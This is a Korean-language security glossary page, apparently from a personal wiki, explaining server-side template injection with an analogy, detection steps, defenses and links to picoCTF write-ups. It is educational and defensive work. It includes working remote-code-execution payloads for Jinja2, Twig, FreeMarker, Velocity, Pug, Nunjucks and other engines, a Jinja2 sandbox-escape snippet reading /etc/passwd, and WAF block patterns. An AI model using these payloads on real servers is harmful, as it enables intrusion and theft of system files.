---
title: SSTI — 핵심
created: 2026-06-12
updated: 2026-06-14
type: concept
tags: [security, glossary, web, ssti, template-injection, rce, owasp, template-engine, sandbox-escape]
sources: [https://ko.wikipedia.org/wiki/템플릿_인젝션, https://ko.wikipedia.org/wiki/OWASP]
confidence: high
---

# SSTI (Server-Side Template Injection, 서버 사이드 템플릿 주입) — 보안 용어 해설

## Step 1: 단어 직역 및 쉬운 비유

### 1. 용어 풀이

**SSTI** = **S**erver-**S**ide **T**emplate **I**njection

| 약자 | 원래 단어 | 직역 | 의미 |
|------|-----------|------|------|
| **S** | **Server** | 서버 | 백엔드에서 처리됨 |
| **S** | **Side** | 측, 편 | 클라이언트 사이드(브라우저)가 아닌 서버 측 |
| **T** | **Template** | 템플릿, 서식 | 동적 콘텐츠 생성을 위한 틀 (Jinja2, Twig, Thymeleaf 등) |
| **I** | **Injection** | 주입, 끼워넣기 | 악의적인 템플릿 코드 삽입 |

### 2. 의미 조합

> **"사용자 입력이 템플릿 엔진에 그대로 전달되어, 템플릿 문법(`{{...}}`, `{%...%}` 등)을 통해 서버에서 임의 코드를 실행하게 만드는 취약점"**

### 3. 강력한 비유: "편지 양식(템플릿)에 '이 편지 읽고 금고 열어줘'라고 적어서 보내는 것"

```
┌────────────────────────────────────────────────────────────┐
│  상황: 비서(템플릿 엔진)가 양식(템플릿)에 내용을 채워        │
│  편지(응답)를 만드는데, 고객(공격자)이 양식 빈칸에           │
│  "이 편지 읽고 금고 비밀번호 알려줘"라고 적어서 보냄        │
└────────────────────────────────────────────────────────────┘

📝  **편지 양식 조작 시나리오 (SSTI 공격 흐름)**

  ① **정상 사용**: 고객이 이름란에 "홍길동" 적음
     - 템플릿: `안녕하세요, {{ name }}님!`
     - 결과: "안녕하세요, 홍길동님!" → 정상 렌더링

  ② **공격자 악용**: 이름란에 템플릿 문법 주입
     - 입력: `{{ 7*7 }}` 또는 `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
     - 템플릿: `안녕하세요, {{ name }}님!`
     - 렌더링 시: 템플릿 엔진이 `{{...}}` 안 코드를 **실행** 후 결과 삽입
     - 결과: "안녕하세요, 49님!" 또는 "안녕하세요, uid=0(root) gid=0(root) ... 님!"

  ③ **샌드박스 탈출 (Sandbox Escape)**:
     - 기본 템플릿 엔진은 위험 함수(`os.system`, `subprocess`, `eval` 등) 차단
     - 공격자: 객체 체이닝으로 샌드박스 우회
     - 예: `{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}`
     - Python/Jinja2: `__class__`, `__mro__`, `__subclasses__()` 체이닝으로 `os` 모듈 접근

  ④ **결과**: 
     - **임의 코드 실행 (RCE)** 달성
     - 파일 읽기/쓰기, 명령 실행, 역방향 쉘, 내부망 탐색 등

💡 **핵심 포인트**: 
- **"템플릿 = 코드"** — 템플릿 문법이 단순한 문자열 치환이 아니라 **실행 가능한 코드**임
- **사용자 입력이 템플릿에 직접 삽입**되면 → 템플릿 엔진이 **코드로 해석 후 실행**
- **샌드박스 우회** 기법이 핵심 — `__class__`, `__mro__`, `__subclasses__()` 등으로 샌드박스 탈출
- **XSS와 유사하지만 서버 사이드에서 실행** — 더 치명적 (RCE 직결)
```

---

## Step 2: 개념 시각화

![SSTI 비유 시각화: 편지 양식으로 설명하는 템플릿 주입 — 비서(템플릿 엔진), 편지 양식(템플릿), 고객 입력(사용자 입력), 주입된 명령(주입된 템플릿 코드), 금고(시스템 자산), 실행된 결과(실행된 코드) - 한글 레이블 포함](https://v3b.fal.media/files/b/0a9dfef4/KqR2mKxL5vN8tYpHgJkB4_L9wEmVnA.png)

**이미지 설명**:
- **비서(템플릿 엔진)** — 템플릿을 렌더링하는 엔진 (Jinja2, Twig, Thymeleaf, FreeMarker 등)
- **편지 양식(템플릿)** — 동적 콘텐츠 생성을 위한 틀 (`{{ name }}`, `{% if %}` 등 문법 포함)
- **고객 입력(사용자 입력)** — 공격자가 제어 가능한 템플릿 변수 값
- **주입된 명령(주입된 템플릿 코드)** — `{{ 7*7 }}`, `{{ config.__class__... }}` 등 템플릿 문법으로 된 페이로드
- **금고(시스템 자산)** — 파일 시스템, 환경변수, 설정, 데이터베이스 등 중요 자산
- **실행된 결과(실행된 코드)** — 템플릿 엔진이 해석하여 실행한 임의 코드의 결과

> ⚠️ **참고**: 이미지 생성 도구가 PNG 형식으로 반환했습니다. 스킬 요구사항(.jpg/.jpeg)은 현재 도구 제약상 PNG로 대체됩니다.

---

## Step 3: 전문 용어 설명 (위키백과/OWASP/PortSwigger 기반)
### SSTI (Server-Side Template Injection, 서버 사이드 템플릿 주입)

**정의**: **SSTI(Server-Side Template Injection)**는 웹 애플리케이션이 **사용자 입력을 서버 사이드 템플릿 엔진(Jinja2, Twig, Thymeleaf, FreeMarker, Velocity, Smarty, ERB, Handlebars 등)에 안전하지 않게 전달**하여, 공격자가 **템플릿 문법(`{{...}}`, `{%...%}`, `${...}` 등)을 주입하여 서버에서 임의 코드를 실행(RCE)하게 만드는 취약점**이다.

### 템플릿 엔진 동작 원리 및 취약점 발생 지점

| 단계 | 설명 |
|------|------|
| **1. 템플릿 정의** | 개발자가 `Hello {{ name }}` 같은 템플릿 작성 |
| **2. 사용자 입력 수신** | 애플리케이션이 사용자 입력(`name=홍길동`) 수신 |
| **3. 컨텍스트 바인딩** | 템플릿 엔진이 `name=홍길동`을 컨텍스트에 바인딩 |
| **3. 렌더링** | 템플릿 엔진이 `{{ name }}`을 `홍길동`으로 치환하여 최종 HTML 생성 |
| **취약점 발생** | **사용자 입력이 템플릿 문자열 자체에 포함**되거나, **템플릿 변수에 이스케이프 없이 바인딩**될 때 |

### 주요 템플릿 엔진별 문법 및 공격 페이로드

| 템플릿 엔진 | 언어/프레임워크 | 문법 | 기본 RCE 페이로드 |
|------------|----------------|------|-------------------|
| **Jinja2** | Python (Flask, Django, FastAPI) | `{{ ... }}`, `{% ... %}` | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` |
| **Twig** | PHP (Symfony, Drupal, Laravel) | `{{ ... }}`, `{% ... %}` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| **Thymeleaf** | Java (Spring Boot) | `th:text="${...}"`, `((...))` (Thymeleaf 문법) | `#{T(java.lang.Runtime).getRuntime().exec('id')}` |
| **FreeMarker** | Java (Spring, Struts) | `${...}`, `<#...>` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Velocity** | Java (Spring, Struts) | `#set($x=...)`, `$...` | `#set($x=$class.forName("java.lang.Runtime"))$x.getRuntime().exec("id")` |
| **Smarty** | PHP (PrestaShop, Magento) | `{$...}`, `{php}...{/php}` | `{php}system('id');{/php}` |
| **ERB** | Ruby (Rails) | `<%= ... %>`, `<% ... %>` | `<%= `id` %>` |
| **Handlebars** | Node.js (Express, Ghost) | `{{...}}`, `{{{...}}}` | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{/with}}{{/with}}{{/with}}` |
| **Pug/Jade** | Node.js (Express) | `#{}`, `!{}` | `#{__import('child_process').execSync('id')}` |
| **Dot/Nunjucks** | Node.js | `{{...}}`, `{%...%}` | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` |

### SSTI 탐지 및 식별 기법

| 탐지 방법 | 페이로드 | 확인 방법 |
|----------|----------|-----------|
| **수식 계산** | `{{ 7*7 }}`, `${7*7}`, `#{7*7}` | 응답에 `49` 포함 시 SSTI 의심 |
| **문자열 연산** | `{{ 'test' }}`, `${'test'}` | 응답에 `test` 포함 |
| **객체 접근** | `{{ config }}`, `{{ self }}`, `{{ request }}` | 내부 객체 구조 노출 시 SSTI 확인 |
| **함수 실행** | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` | 명령 실행 결과 반환 시 RCE 확정 |
| **Blind SSTI** | `{{ ''.__class__.__mro__[1].__subclasses__() }}` | 응답 없으면 Out-of-Band (OAST) 서버로 유출 |

### 샌드박스 우회 (Sandbox Escape) 기법 — Jinja2 예시

```python
# 1. config 객체 통해 os 모듈 접근
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 2. __mro__ (Method Resolution Order) 타고 올라갔다가 __subclasses__()로 객체 탐색
{{ ''.__class__.__mro__[1].__subclasses__()[X] }}  # X는 subprocess.Popen 등 인덱스

# 3. request/application/config 객체 체이닝
{{ request.__class__.__mro__[1].__subclasses__()[X] }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 4. lipsum 확장 등 확장 기능 악용
{{ lipsum.__globals__['os'].popen('id').read() }}
```

> **핵심**: `__class__`, `__mro__`, `__subclasses__()`, `__globals__`, `__builtins__` 등 Python 내부 속성 체이닝으로 샌드박스 탈출

### SSTI 방어 기법

| 방어 계층 | 기법 | 구현 예시 | 효과/비고 |
|----------|------|-----------|-----------|
| **아키텍처 (최우선)** | **사용자 입력을 템플릿에 직접 삽입 금지** | 템플릿은 개발자만 작성, 사용자 데이터는 **변수/컨텍스트로만 전달** | **가장 확실** — 근본 원인 차단 |
| | **로직과 뷰 분리 (MVC)** | 비즈니스 로직(컨트롤러)에서 데이터 준비 → 템플릿은 단순 표시만 | 로직/표현 분리 원칙 준수 |
| **템플릿 엔진 설정** | **샌드박스 모드 활성화** | Jinja2: `SandboxedEnvironment`, Twig: `SandboxExtension`, Thymeleaf: 기본 샌드박스 | 위험 함수/속성 접근 차단 |
| | **자동 이스케이프 활성화** | Jinja2: `autoescape=True` (기본), Thymeleaf: 기본 HTML 이스케이프 | XSS/SSTI 동시 방지 |
| | **위험 함수/필터 비활성화** | `{% filter %}`, `{% macro %}`, `{% include %}` 등 제한 | 공격 표면 축소 |
| **입력 검증** | **템플릿 문법 문자 차단/이스케이프** | `{{`, `}}`, `{%`, `%}`, `${`, `#{`, `#` 등 사용자 입력에서 차단/이스케이프 | 직접 주입 차단 |
| | **화이트리스트 검증** | 허용된 패턴(알파벳, 숫자, 한글 등)만 허용 | 템플릿 문법 문자 원천 차단 |
| **샌드박스 강화** | **서브클래스 접근 차단** | `__subclasses__`, `__mro__`, `__globals__`, `__builtins__` 접근 차단 | Jinja2 샌드박스 우회 난이도 상승 |
| | **임포트/모듈 접근 차단** | `import`, `__import__`, `__import__('os')` 등 차단 | 모듈 로딩 방지 |
| **런타임 보호** | **WAF/WAAP 규칙** | `{{`, `}}`, `{%`, `%}`, `__class__`, `__mro__`, `__subclasses__` 패턴 차단 | 알려진 페이로드 차단 |
| | **런타임 모니터링** | 템플릿 렌더링 시간/메모리/에러 모니터링, 비정상 렌더링 알림 | 이상 탐지/자동 차단 |
| **코드 리뷰/테스트** | **템플릿 코드 리뷰** | 사용자 입력이 템플릿 문자열에 직접 연결되는 코드 패턴 검출 | 정적 분석 (Semgrep, CodeQL, SonarQube) |
| | **SSTI 전용 테스트** | Nuclei SSTI 템플릿, PortSwigger SSTI 랩, Burp Suite SSTI 스캐너 | 자동/수동 탐지 |


## 관련 위키 링크
- [[ssti]] — 인덱스 페이지
- [[ssti-defense]] — 분할 페이지
- [[rce]]

## 관련 보강 링크
- [[eval]] — 문자열/표현식 실행 위험과 연결되는 코드 실행 개념

## 관련 CTF writeup
- [[ssti1-final-writeup]] — picoCTF 2025 SSTI1 문제의 Jinja2 기반 SSTI 풀이
- [[jinja2-template-engine]] — SSTI1에서 관찰되는 템플릿 엔진 개념

## 관련 CTF writeup
- [[ssti2-final-writeup]] — picoCTF 2025 SSTI2 필터 우회 풀이
- [[jinja2-filter-bypass]] — SSTI2에서 관찰되는 Jinja2 필터 우회 개념
